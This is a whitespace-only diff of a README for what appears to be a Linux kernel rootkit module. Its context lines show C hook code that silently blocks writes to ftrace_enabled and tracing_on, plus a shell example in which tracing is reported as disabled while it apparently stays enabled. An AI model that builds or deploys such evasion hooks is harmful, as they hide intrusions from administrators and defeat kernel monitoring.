@@ -24,12 +24,12 @@ if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
 ### Snippet from `hooks/write.h`
 
 ```c
-/* Silently blocks writes to ftrace_enabled and tracing_on using the same 
+/* Silently blocks writes to ftrace_enabled and tracing_on using the same
    method employed in clear-taint-dmesg, but adapted for the write syscall. */
 
 if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
     strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
-        
+
     fput(file); // Free the file object after verification
 
     // Allocate a temporary buffer in kernel space
@@ -70,7 +70,7 @@ cat /proc/sys/kernel/ftrace_enabled; cat /sys/kernel/tracing/tracing_on
 # Outputs 0 (even if internally it remains enabled)
 ```
 
-### Extra 
+### Extra
 
 [![Discord](https://img.shields.io/badge/Discord-%235865F2.svg?&logo=discord&logoColor=white)](https://discord.gg/66N5ZQppU7)
 [![C](https://img.shields.io/badge/C-00599C?logo=c&logoColor=white)]()
